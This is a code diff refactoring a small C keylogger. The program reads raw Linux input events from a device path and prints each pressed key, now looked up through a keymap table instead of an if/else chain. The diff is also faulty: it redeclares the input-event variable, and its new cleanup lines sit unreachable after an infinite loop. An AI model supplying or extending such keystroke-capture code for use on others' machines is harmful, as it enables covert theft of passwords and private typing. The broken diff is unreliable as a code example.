@@ -3,6 +3,36 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <linux/input.h>
+#include <string.h>
+
+struct key_mapping{
+    int code;
+    char* key;
+};
+
+struct key_mapping keymap[] = {
+    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"},
+    {KEY_5, "5"}, {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"},
+    {KEY_9, "9"}, {KEY_0, "0"},
+    {KEY_A, "A"}, {KEY_B, "B"}, {KEY_C, "C"}, {KEY_D, "D"},
+    {KEY_E, "E"}, {KEY_F, "F"}, {KEY_G, "G"}, {KEY_H, "H"},
+    {KEY_I, "I"}, {KEY_J, "J"}, {KEY_K, "K"}, {KEY_L, "L"},
+    {KEY_M, "M"}, {KEY_N, "N"}, {KEY_O, "O"}, {KEY_P, "P"},
+    {KEY_Q, "Q"}, {KEY_R, "R"}, {KEY_S, "S"}, {KEY_T, "T"},
+    {KEY_U, "U"}, {KEY_V, "V"}, {KEY_W, "W"}, {KEY_X, "X"},
+    {KEY_Y, "Y"}, {KEY_Z, "Z"},
+    {KEY_SPACE, " "},
+    {0, NULL}
+};
+
+char* get_key_name(int code){
+    for(int i=0; keymap[i].code != 0; i++){
+        if(keymap[i].code == code){
+            return keymap[i].key;
+        }
+    }
+    return NULL;
+}
 
 int main(int argc, char *argv[]){
     if(argc != 2){
@@ -12,80 +42,27 @@ int main(int argc, char *argv[]){
     printf("keylogger active ...\n");
 
 
-    int fd = open(argv[1], O_RDONLY, 0);
+    int fd = open(argv[1], O_RDONLY);
+    if(fd < 0){
+        perror("open");
+        exit(-1);
+    }
     printf("opened fd: %d\n", fd);
     struct input_event ie;
 
-    while(1){
+    struct input_event ie;
+    while (1) {
         read(fd, &ie, sizeof(ie));
-        if(ie.type != EV_KEY) continue;
-        if(ie.value != 1) continue;
-        if(ie.code >= 2 && ie.code <=10){
-            printf("key pressed: %d", ie.code-1);
-
-        }else if (ie.code ==11){
-            printf("0");
-        }else if (ie.code == KEY_A){
-            printf("A");
-        }else if (ie.code == KEY_B){
-            printf("B");
-        }else if (ie.code == KEY_C){
-            printf("C");
-        }else if (ie.code == KEY_C){
-            printf("C");
-        }else if (ie.code == KEY_D){
-            printf("D");
-        }else if (ie.code == KEY_E){
-            printf("E");
-        }else if (ie.code == KEY_F){
-            printf("F");
-        }else if (ie.code == KEY_G){
-            printf("G");
-        }else if (ie.code == KEY_H){
-            printf("H");
-        }else if (ie.code == KEY_I){
-            printf("I");
-        }else if (ie.code == KEY_J){
-            printf("J");
-        }else if (ie.code == KEY_K){
-            printf("K");
-        }else if (ie.code == KEY_L){
-            printf("L");
-        }else if (ie.code == KEY_M){
-            printf("M");
-        }else if (ie.code == KEY_N){
-            printf("N");
-        }else if (ie.code == KEY_O){
-            printf("O");
-        }else if (ie.code == KEY_P){
-            printf("P");
-        }else if (ie.code == KEY_Q){
-            printf("Q");
-        }else if (ie.code == KEY_R){
-            printf("R");
-        }else if (ie.code == KEY_S){
-            printf("S");
-        }else if (ie.code == KEY_T){
-            printf("T");
-        }else if (ie.code == KEY_U){
-            printf("U");
-        }else if (ie.code == KEY_V){
-            printf("V");
-        }else if (ie.code == KEY_W){
-            printf("W");
-        }else if (ie.code == KEY_X){
-            printf("X");
-        }else if (ie.code == KEY_Y){
-            printf("Y");
-        }else if (ie.code == KEY_Z){
-            printf("Z");
-        }else if(ie.code == KEY_SPACE){
-            printf(" ");
-        }
-        else{
-            printf("unknown key pressed ... code = %d\n", ie.code);
+        if (ie.type != EV_KEY || ie.value != 1) continue;
+        
+        char* keyname = get_key_name(ie.code);
+        if (keyname) {
+            printf("%s", keyname);
+        } else {
+            printf("[?%d]", ie.code);
         }
         fflush(stdout);
-        // printf("key pressed: %d\n", ie.code);
     }
+    close(fd);
+    return 0;
 }
